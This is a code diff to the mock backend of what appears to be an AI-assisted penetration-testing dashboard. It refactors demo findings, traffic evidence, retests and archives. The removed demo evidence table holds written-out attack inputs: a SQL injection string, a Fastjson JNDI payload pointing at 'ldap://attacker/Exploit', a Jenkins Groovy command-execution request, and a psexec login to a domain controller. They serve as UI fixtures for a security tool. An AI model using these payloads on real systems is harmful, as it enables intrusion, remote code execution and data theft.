@@ -49,13 +49,29 @@ const mockLLMRecords = structuredClone(D.llmRecords);
 const mockTaskTemplates = structuredClone(D.taskTemplates);
 const mockTaskCategories = structuredClone(D.taskCategories);
 const mockConversations = structuredClone(D.conversations);
-const mockRetests: FindingRetest[] = [];
+const mockRetests: FindingRetest[] = D.findingRetestSeeds.map((seed, index) => {
+  const findingIndex = D.findings.findIndex((item) => item.id === seed.finding_id);
+  if (findingIndex < 0) throw new Error(`Demo retest is missing finding ${seed.finding_id}`);
+  const when = D.findings[findingIndex]?.ts ?? new Date(0).toISOString();
+  return {
+    id: index + 1,
+    finding_id: findingIndex + 1,
+    conversation_id: null,
+    status: "completed",
+    verdict: seed.verdict,
+    notes: "",
+    summary: seed.summary,
+    evidence: "This preview did not send a request.",
+    error: "",
+    created_at: when,
+    started_at: when,
+    finished_at: when,
+  };
+});
 const mockRetestMessages: Record<number, Activity[]> = {};
 
-// ── Associated traffic evidence(finding traffic) ─────────────────────────────────────────────
-// The backend puts the request/Response snapshot is saved independently evidence Table,For front-end details page FindingTrafficPanel Display.
-// demo Here are preset bindings for some vulnerabilities,Snapshot direct reference mock Capture packet(data.traffic.exchanges),
-// The remaining vulnerabilities return empty bindings. Missing this set of routes,The details page will be read due to empty objects and access bindings.length Crash the entire page.
+// Associated traffic for a finding. Every finding has at least one recorded exchange.
+// Request and response text comes from trafficBodies, one body per exchange id.
 const mockExchangeById = new Map((D.traffic.exchanges ?? []).map((exchange) => [exchange.id, exchange]));
 
 interface MockBindingSeed {
@@ -63,46 +79,6 @@ interface MockBindingSeed {
   role: TrafficEvidenceRole;
   note?: string;
 }
-
-// Preset traffic evidence for each vulnerability(finding id → Binded packet capture).Select the request corresponding to the vulnerability semantics,
-// Let demo Details page[Associated traffic]Blocks look real.
-const mockFindingTrafficSeeds: Record<string, MockBindingSeed[]> = {
-  "f-1": [{ traffic_id: "x-2", role: "proof", note: "The q parameter is injected into the payload, and an MSSQL error is echoed in response." }],
-  "f-2": [
-    { traffic_id: "x-8", role: "baseline", note: "My order id=1001, as a normal control." },
-    { traffic_id: "x-9", role: "proof", note: "Change id=1002 to read other people's orders beyond your authority." },
-  ],
-  "f-12": [
-    { traffic_id: "x-15", role: "proof", note: "Fastjson @type JNDI payload, triggers connection back." },
-    { traffic_id: "x-16", role: "verification", note: "A second request is made to confirm the execution of the command." },
-  ],
-  "f-15": [
-    { traffic_id: "x-17", role: "baseline", note: "Jenkins Script Console is not authorized to be reached." },
-    { traffic_id: "x-18", role: "proof", note: "scriptText executes the Groovy command and returns SYSTEM." },
-  ],
-  "f-17": [{ traffic_id: "x-19", role: "proof", note: "psexec uses svc_deploy to log in to domain controller DC01." }],
-};
-
-// demo Use fixed message body,Avoid detail pages Request/Response Blank.
-const mockEvidenceBodies: Record<string, { req: string; resp: string }> = {
-  "x-2": {
-    req: "q=1' AND 1=CONVERT(int,@@version)--",
-    resp: '{"error":"Conversion failed when converting the nvarchar value \'Microsoft SQL Server 2019 ...\' to data type int."}',
-  },
-  "x-8": { req: "", resp: '{"order_id":1001,"user_id":42,"amount":199.00}' },
-  "x-9": {
-    req: "",
-    resp: '{"order_id":1002,"user_id":77,"amount":1299.00,"address":"Example Street","phone":"555-0100"}',
-  },
-  "x-15": {
-    req: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker/Exploit","autoCommit":true}',
-    resp: '{"status":"error","message":"internal server error"}',
-  },
-  "x-16": { req: '{"cmd":"id"}', resp: '{"status":"ok","out":"uid=33(www-data) gid=33(www-data)"}' },
-  "x-17": { req: "", resp: "<html><title>Jenkins Script Console</title>..." },
-  "x-18": { req: "script=println 'whoami'.execute().text", resp: "nt authority\\system" },
-  "x-19": { req: "[psexec] acme/svc_deploy@10.10.10.10", resp: "[*] Got SYSTEM on DC01" },
-};
 
 // Runtime status:finding id → Binding list(Can add, delete or change the order,demo Memory state).First access initialized by seed.
 const mockFindingTraffic: Record<string, FindingTrafficBinding[]> = {};
@@ -118,7 +94,7 @@ function mockBuildSnapshot(trafficId: string): TrafficEvidenceSnapshot {
   } catch {
     // Use the root path as a guarantee.
   }
-  const body = mockEvidenceBodies[trafficId];
+  const body = D.trafficBodies[trafficId] ?? { req: "", resp: "" };
   return {
     id: `snap-${trafficId}`,
     source_traffic_id: trafficId,
@@ -138,7 +114,7 @@ function mockBuildSnapshot(trafficId: string): TrafficEvidenceSnapshot {
 
 function mockTrafficBindings(findingID: string): FindingTrafficBinding[] {
   if (!mockFindingTraffic[findingID]) {
-    const seeds = mockFindingTrafficSeeds[findingID] ?? [];
+    const seeds = D.findingTrafficSeeds[findingID] ?? [];
     mockFindingTraffic[findingID] = seeds.map((seed, index) => ({
       id: `b-${findingID}-${index + 1}`,
       finding_id: findingID,
@@ -214,22 +190,25 @@ type MockTaskArchiveSnapshot = {
 };
 type MockTaskArchive = TaskArchive & { snapshot: MockTaskArchiveSnapshot };
 
-// One finished demo task already has a ready archive so the archive list and detail
-// pages read a real row. The live task list is left in place.
-function seedDemoTaskArchive(): MockTaskArchive {
-  const task = structuredClone(D.tasks.find((item) => item.id === "t-vpn-edge"));
-  if (!task) throw new Error("Demo archive task is missing");
+// Finished demo tasks keep a ready archive so the archive list is not a single row.
+// The live task list is left in place so findings still resolve.
+function seedDemoTaskArchive(taskId: string, archiveId: number): MockTaskArchive {
+  const source = D.tasks.find((item) => item.id === taskId);
+  if (!source) throw new Error(`Demo archive task is missing: ${taskId}`);
+  const task = structuredClone(source);
   const numericTaskID = D.tasks.findIndex((item) => item.id === task.id) + 1;
   const when = task.completed_at ?? task.created_at;
+  const assetIDs = D.assets.filter((asset) => asset.task_ids.includes(numericTaskID)).map((asset) => asset.id);
+  const findingCount = D.findings.filter((finding) => finding.task_id === task.id).length;
   return {
-    id: 1,
+    id: archiveId,
     task_id: numericTaskID,
     state: "ready",
     phase: "Archiving completed",
     progress: 100,
     format_version: 1,
-    original_size: 4096,
-    compressed_size: 1300,
+    original_size: 4096 + assetIDs.length * 256,
+    compressed_size: 1300 + assetIDs.length * 64,
     task_name: task.name ?? "",
     task_description: task.description,
     task_goal: task.goal,
@@ -238,7 +217,7 @@ function seedDemoTaskArchive(): MockTaskArchive {
     category_name: task.category_name,
     source_task_ids: [],
     remaining_timeout_seconds: 0,
-    data_counts: { assets: 0, findings: 0, llm_records: 0 },
+    data_counts: { assets: assetIDs.length, findings: findingCount, llm_records: 0 },
     aggregate_stats: {
       tokens: {
         input_tokens: task.tokens?.input_tokens ?? 0,
@@ -246,18 +225,18 @@ function seedDemoTaskArchive(): MockTaskArchive {
         cache_read_tokens: task.tokens?.cache_read_tokens ?? 0,
         cache_write_tokens: task.tokens?.cache_write_tokens ?? 0,
       },
-      findings: {},
+      findings: { ...(task.findings ?? {}) },
     },
     archived_at: when,
     requested_at: when,
     created_at: task.created_at,
     updated_at: when,
-    snapshot: { task, numericTaskID, assetIDs: [], assetSources: [] },
+    snapshot: { task, numericTaskID, assetIDs, assetSources: [] },
   };
 }
 
-const mockTaskArchives: MockTaskArchive[] = [seedDemoTaskArchive()];
-let nextMockTaskArchiveID = 2;
+const mockTaskArchives: MockTaskArchive[] = [seedDemoTaskArchive("t-vpn-edge", 1), seedDemoTaskArchive("t-northwind", 2)];
+let nextMockTaskArchiveID = 3;
 const mockTaskAssetIDs = new Map(D.tasks.map((task, index) => [task.id, index + 1]));
 const mockTaskScopes = new Map<string, TaskScopeRow[]>();
 type MockTaskAssetSource = Pick<Asset, "task_source" | "task_source_summary" | "task_source_node_id">;
@@ -1285,6 +1264,44 @@ export const MOCK_GET_ROUTES = [
   "/logs/history",
 ];
 
+function mockTrafficList(q: URLSearchParams) {
+  const all = D.traffic.exchanges ?? [];
+  const host = q.get("host") ?? "";
+  const method = q.get("method") ?? "";
+  const query = (q.get("q") ?? "").toLowerCase();
+  const pathQuery = q.get("path") ?? "";
+  const status = q.get("status") ?? "";
+  const bodyQuery = (q.get("body") ?? "").toLowerCase();
+  const respMin = q.get("resp_min");
+  const respMax = q.get("resp_max");
+  const rows = all.filter((row) => {
+    if (host && row.host !== host) return false;
+    if (method && method !== "all" && row.method !== method) return false;
+    if (status && status !== "all" && String(row.status) !== status) return false;
+    if (query && !`${row.host} ${row.url}`.toLowerCase().includes(query)) return false;
+    if (pathQuery && !row.url.includes(pathQuery)) return false;
+    if (respMin && row.resp_len < Number(respMin)) return false;
+    if (respMax && row.resp_len > Number(respMax)) return false;
+    if (bodyQuery) {
+      const body = D.trafficBodies[row.id];
+      const blob = `${body?.req ?? ""}\n${body?.resp ?? ""}`.toLowerCase();
+      if (!blob.includes(bodyQuery)) return false;
+    }
+    return true;
+  });
+  const page = Math.max(0, Number(q.get("page") ?? 0) || 0);
+  const size = Math.max(1, Number(q.get("size") ?? 100) || 100);
+  return {
+    enabled: D.traffic.enabled,
+    proxy: D.traffic.proxy,
+    count: all.length,
+    total: rows.length,
+    page,
+    size,
+    exchanges: rows.slice(page * size, page * size + size),
+  };
+}
+
 export async function mockHandle<T>(method: string, rawPath: string, body?: BodyInit | null): Promise<T> {
   advanceMockRetests();
   await delay();
@@ -1803,8 +1820,12 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
   }
 
   // ── Coverage / Overlay / Asset association (task dimension)──
-  if (seg[0] === "tasks" && seg[2] === "coverage" && seg.length === 3) return D.coverage;
-  if (seg[0] === "tasks" && seg[2] === "coverage-graph") return D.coverageGraph;
+  if (seg[0] === "tasks" && seg[2] === "coverage" && seg.length === 3) {
+    return seg[1] === "t-northwind" || seg[1] === "5" ? D.northwindCoverage : D.coverage;
+  }
+  if (seg[0] === "tasks" && seg[2] === "coverage-graph") {
+    return seg[1] === "t-northwind" || seg[1] === "5" ? D.northwindCoverageGraph : D.coverageGraph;
+  }
   if (seg[0] === "tasks" && seg[2] === "asset-refs") return D.assetRefsFor(Number(q.get("asset_id") ?? 0));
 
   // ── Task test range (add, delete, check)──
@@ -2293,7 +2314,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     if (seg.length === 5 && seg[4] !== "order" && m === "GET") {
       const binding = bindings.find((item) => item.id === seg[4]);
       if (!binding) throw new Error("Evidence does not exist");
-      const body = mockEvidenceBodies[binding.snapshot.source_traffic_id] ?? { req: "", resp: "" };
+      const body = D.trafficBodies[binding.snapshot.source_traffic_id] ?? { req: "", resp: "" };
       return {
         binding: structuredClone(binding),
         request: mockEvidencePreview(body.req),
@@ -2304,7 +2325,7 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
     if (seg.length === 6 && seg[5] === "body" && m === "GET") {
       const binding = bindings.find((item) => item.id === seg[4]);
       if (!binding) throw new Error("Evidence does not exist");
-      const body = mockEvidenceBodies[binding.snapshot.source_traffic_id] ?? { req: "", resp: "" };
+      const body = D.trafficBodies[binding.snapshot.source_traffic_id] ?? { req: "", resp: "" };
       const side = q.get("side") === "request" ? body.req : body.resp;
       return mockEvidencePreview(side);
     }
@@ -2498,8 +2519,11 @@ function route(m: string, path: string, seg: string[], q: URLSearchParams, b: Re
   if (path === "/traffic" && m === "DELETE") return { deleted: 0 };
   if (path === "/traffic/hosts" && m === "DELETE") return { deleted: (b.hosts as unknown[])?.length ?? 0 };
   if (path === "/traffic/hosts") return { hosts: D.trafficHosts };
-  if (path === "/traffic") return D.traffic;
-  if (path === "/traffic/exchange") return D.trafficDetail;
+  if (path === "/traffic") return mockTrafficList(q);
+  if (path === "/traffic/exchange") {
+    const body = D.trafficBodies[q.get("id") ?? ""];
+    return body ? { req: body.req, resp: body.resp } : { req: "", resp: "" };
+  }
   if (path === "/settings" && m === "GET") return D.settings;
   if (path === "/settings" && m === "PUT") return { ...D.settings, ...b };
   if (path === "/settings/web-search/test") return { ok: true, count: 5, backend: D.settings.web_search_backend };
